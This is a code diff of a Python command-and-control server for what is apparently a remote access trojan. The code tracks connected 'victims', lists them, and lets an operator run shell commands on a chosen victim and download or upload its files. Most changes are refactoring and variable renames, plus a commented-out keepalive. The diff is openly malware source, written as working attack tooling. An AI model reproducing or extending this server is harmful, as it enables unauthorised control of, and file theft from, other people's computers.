@@ -35,16 +35,16 @@ class InteractVictim():
     
         while self.conn:
         
-            command = input(f"{self.id}-> ").strip(' ')
-    
-            if command in ["help", "back"]:
+            command = (input(f"{self.id}-> ").strip(' '))
 
-                if "help" == command:
-                    self._victim_help()
-                else:
-                    break
+            if "help" == command:
+                self._victim_help()
+
+            elif "back" == command:
+                break
 
             elif "!" == command[:1]:
+                
                 output = utils._exec_command(command[1:])
 
                 if output:
@@ -55,6 +55,7 @@ class InteractVictim():
                 utils._send(self.conn, command)
 
                 file_name = command[9:]
+
                 print(f"[+] Downloading {file_name}...")
                 file_data = utils._receive(self.conn)
 
@@ -62,17 +63,20 @@ class InteractVictim():
 
             elif "upload" == command[:6]:
 
-                file_name = command[6:].strip(' ')
-                file = os.path.abspath(file_name)
+                cmds = command.split(' ')
 
-                if utils._does_file_exists(file):
+                file_name = os.path.abspath(cmds[1]) # path of the file in the server
+
+                if utils._does_file_exists(file_name):
 
                     print(f"[+] Uploading {file_name}...")
 
                     utils._send(self.conn, command)
-                    utils._send_file(self.conn, file=file)
+                    utils._send_file(self.conn, file_name)
+
                 else:
                     print(f"[!] File, {file_name} does not exists.")
+                    continue
 
 
             else:
@@ -95,7 +99,7 @@ class Server():
         self.is_server_on = False
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.victims_dict = {} # Stores conn of the victim(s)
-        self.victim_id = 0
+        self.victims_id = 0
 
     def _accept_connection(self) -> None:
         """Adds conn, addr to connected_client dict."""
@@ -104,13 +108,18 @@ class Server():
 
             try:
                 conn, addr = self.sock.accept()
-                self.victim_id += 1
+                self.victims_id += 1
                 print(f"Got connection from {addr}")
 
-                self.victims_dict.update({self.victim_id: conn})
+                self.victims_dict.update({self.victims_id: conn})
 
             except Exception as e:
                 print(e)
+
+            # alive_que = utils._receive(conn)
+            
+            # if b'PING' == alive_que:
+            #     utils._send(conn, b'PONG')
                 
 
     def _close_connection(self, victim_id:int) -> None:
@@ -124,7 +133,7 @@ class Server():
             time.sleep(0.5)
             conn.close()
 
-            self.victim_id -= 1
+            self.victims_id -= 1
             self.victims_dict.pop(victim_id)
 
         except Exception as e:
@@ -160,7 +169,7 @@ class Server():
     def _list_victims(self):
         """Lists all available connection."""
 
-        print(f"[+] Total {self.victim_id} victims...")
+        print(f"[+] Total {self.victims_id} victims...")
         print("ID\tVictim")
 
         for id in self.victims_dict:
@@ -177,7 +186,7 @@ class Server():
                 if not cmd:
                     continue
 
-                elif cmd == "help":
+                elif "help" == cmd:
                     self._console_help()
 
                 elif cmd.startswith("!"):
@@ -186,7 +195,7 @@ class Server():
                     if cmd_output:
                         print(cmd_output)
     
-                elif cmd == "exit":
+                elif "exit" == cmd:
                     self.is_server_on = False
     
                     # Close a specific connection
@@ -200,10 +209,10 @@ class Server():
 
                     self._close_connection(id)
     
-                elif cmd == "jobs":
+                elif "jobs" == cmd:
                     self._list_victims()
     
-                elif cmd[:8] == "interact":
+                elif "interact" ==cmd[:8]:
                     id = int(cmd[8:])
 
                     if not self._victim_exists(id):
